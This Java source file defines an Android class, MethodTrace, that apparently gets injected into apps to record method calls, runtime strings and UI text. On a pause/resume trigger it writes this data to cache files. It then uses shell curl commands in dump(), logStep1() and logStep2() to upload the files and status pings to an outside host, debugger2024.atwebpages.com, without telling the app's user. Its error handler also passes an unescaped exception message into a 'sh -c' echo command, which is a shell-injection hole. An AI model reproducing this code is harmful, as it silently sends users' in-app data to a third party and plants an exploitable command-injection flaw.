package com.mycompany.myapp;

import android.content.*;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.util.*;
import java.lang.Process;
import java.util.concurrent.locks.*;
import android.util.Base64;
import android.widget.*;

public class MethodTrace {
    private static final ReadWriteLock fileLock = new ReentrantReadWriteLock();
    private static HashMap<String, Long[]> methodMap = new HashMap<>();
    private static ArrayList<String> methods = new ArrayList<>();
    private static File docDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
    private static File filePath = new File(docDir, "/trace/trace.txt");
    private static File rtDataPath = new File(docDir, "/trace/runtimedump.txt");
    private static File dumpLock = new File(docDir, "/trace/lock");
    private static int dataLimitLength = 65535;
    // V2.0
    private static HashMap<String, Boolean> runtimeDataMap = new HashMap<>();
    private static int chunkLimitLength = 250 * 1000;
    private static ArrayList<String[]> recorderLine = new ArrayList<>();
    private static Context ctx = null;
    private static String cacheDir = "/data/user/0/@PACKAGE_NAME@/cache/";
    private static boolean recordEnabled = true;
    private static long lastOnPause = 0L;
    private static String lastTraceActivity = "";
    private static String host = "http://debugger2024.atwebpages.com";

    // TODO: rework
    public static void writeTrace(String methodName) {
        if (dumpLock.exists())
            return;

        try {
            fileLock.writeLock().lock();

            // on reset
            if (filePath.length() == 0) {
                methodMap = new HashMap<>();
                methods = new ArrayList<>();
            }

            Long[] props = methodMap.containsKey(methodName) ? methodMap.get(methodName) : new Long[] { 0L, 0L };
            long time = props[0];
            long occurence = props[1];
            // System.out.println(methodName + " " + time + " " + occurence);

            if (!methodMap.containsKey(methodName) || System.nanoTime() - time > 500_000_000L) {
                // update
                if (!methodMap.containsKey(methodName))
                    methods.add(methodName);

                methodMap.put(methodName, new Long[] { System.nanoTime(), occurence + 1L });

                try {
                    // write
                    FileWriter fileWriter = new FileWriter(filePath);
                    BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

                    // Write contents to file
                    for (String method : methods) {
                        bufferedWriter.write(method + "::" + String.valueOf(methodMap.get(method)[0]) + "::"
                                + String.valueOf(methodMap.get(method)[1]));
                        bufferedWriter.newLine();
                    }

                    // Flush and close the writer
                    bufferedWriter.flush();
                    bufferedWriter.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            } else {
                methodMap.put(methodName, new Long[] { System.nanoTime(), occurence + 1L });
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            fileLock.writeLock().unlock();
        }
    }

    public static void setContext(Context c) {
        ctx = c;
    }

    private static void logStep1() {
        String req = String.format("curl '%s/logger.php?step=%d'", host, 1);
        try {
            Runtime.getRuntime().exec(new String[] { "sh", "-c", req });
        } catch (Exception e) {
        }
    }

    private static void logStep2(int lines) {
        String req = String.format("curl '%s/logger.php?step=%d&lines=%d'", host, 2, lines);
        try {
            Runtime.getRuntime().exec(new String[] { "sh", "-c", req });
        } catch (Exception e) {
        }

    }

    private static void logStep3() {

    }

    public static void updateOnPause() {
        StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];
        lastTraceActivity = trace.getClassName();
        lastOnPause = System.currentTimeMillis();

    }

    public static void updateOnResume() {
        StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];

        // Toast.makeText(ctx, String.valueOf(System.currentTimeMillis() - lastOnPause),
        // 1000).show();
        long interval = System.currentTimeMillis() - lastOnPause;
        if (interval < 2000 && interval > 300 && trace.getClassName().equals(lastTraceActivity)) {
            if (recordEnabled) {
                // Toast.makeText(ctx, String.valueOf(runtimeDataMap.size()), 1000).show();

                if (!runtimeDataMap.isEmpty()) {
                    dump();
                } else {
                    logStep2(0);
                }
                recordEnabled = false;

            } else {
                recordEnabled = true;
                logStep1();
            }

        }

        if (lastOnPause == 0) {
            logStep1();
        }
    }

    public static void dump() {
        try {
            // Split to partitions
            ArrayList<StringBuilder> partitions = new ArrayList<>();
            partitions.add(new StringBuilder());
            int curChunkSize = 0;
            int compressedCnt = 0;
            for (int i = 0; i < recorderLine.size(); i++) {
                String[] props = recorderLine.get(i); // 0:label, 1:class, 2:method, 3:file (or null), 4:line, 5:text
                compressedCnt++;
                // Group same consecutive outputs in same method
                for (int j = i + 1; j < recorderLine.size(); j++) {
                    String[] nextProps = recorderLine.get(j);
                    if (nextProps[1].equals(props[1]) && nextProps[2].equals(props[2])
                            && nextProps[5].equals(props[5])) {
                        if (props[4] != nextProps[4])
                            props[4] = props[4] + "->" + nextProps[4];
                        i = j + 1;
                    } else {
                        break;
                    }
                }
                String fullFormat = String.format("%s| %s.%s(%s:%s) ==> %s", props[0], props[1], props[2],
                        props[3] == null ? "?" : props[3], props[4], props[5]);
                int newChunkSize = curChunkSize + fullFormat.length();
                if (newChunkSize > chunkLimitLength) {
                    partitions.add(new StringBuilder());
                    curChunkSize = fullFormat.length();
                } else {
                    curChunkSize += fullFormat.length();
                }
                partitions.get(partitions.size() - 1).append(fullFormat);
                partitions.get(partitions.size() - 1).append(System.lineSeparator());
            }

            logStep2(compressedCnt);

            String stamp = String.valueOf(System.currentTimeMillis()); // 1705140916160

            // write file
            int upCount = 1;
            ArrayList<String> outNames = new ArrayList<>();
            for (StringBuilder p : partitions) {
                // prepare
                String outName = String.format("out%d.txt", upCount);
                outNames.add(outName);
                File tst = new File(cacheDir + outName);
                tst.createNewFile();
                FileWriter fileWriter = new FileWriter(tst);
                BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

                // Write contents to file
                bufferedWriter.write(p.toString());
                bufferedWriter.write(System.lineSeparator());
                bufferedWriter.write(String.format("%s-%d_of_%d", stamp, upCount++, partitions.size()));

                // Flush and close the writer
                bufferedWriter.flush();
                bufferedWriter.close();
            }

            // Upload!! OuO v_v o.O
            for (String name : outNames) {
                String cmd = String.format("cd %s && curl --data-binary @%s %s/test.php", cacheDir, name, host);
                Runtime.getRuntime().exec(new String[] { "sh", "-c", cmd });
            }

        } catch (Exception e) {
            try {
                String cmd = String.format("cd %s && echo '%s' >> error.log", cacheDir, e.getMessage());
                Runtime.getRuntime().exec(new String[] { "sh", "-c", cmd });
            } catch (Exception ee) {
            }
        }
        recorderLine = new ArrayList<>();
        runtimeDataMap = new HashMap<>();
    }

    private static String[] constructLine(boolean isUi, boolean isArray, String text) {
        StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[2];
        return new String[] { isUi ? "@UIText" : (isArray ? "@General[]" : "@General"),
                trace.getClassName(), trace.getMethodName(), trace.getFileName(), String.valueOf(trace.getLineNumber()),
                text.substring(0, Math.min(text.length(), dataLimitLength)) };
    }

    public static void writeRTData(String s) {
        if (s != null && recordEnabled) {
            String[] line = constructLine(false, false, s);
            String checkStr = String.join(",", line);

            if (!runtimeDataMap.containsKey(checkStr)) {
                runtimeDataMap.put(checkStr, true);
                recorderLine.add(line);
            }
        }
    }

    public static void writeRTData(String[] s) {

        if (s != null && recordEnabled) {
            String[] line = constructLine(false, true, "new String[]{" + String.join(",", s) + "}");
            String checkStr = String.join(",", line);

            if (!runtimeDataMap.containsKey(checkStr)) {
                runtimeDataMap.put(checkStr, true);
                recorderLine.add(line);
            }
        }
    }

    public static void writeRTData(CharSequence cs) { // UI set text
        if (cs != null && recordEnabled) {
            String[] line = constructLine(true, false, cs.toString());
            String checkStr = String.join(",", line);

            if (!runtimeDataMap.containsKey(checkStr)) {
                runtimeDataMap.put(checkStr, true);
                recorderLine.add(line);
            }
        }
    }

}
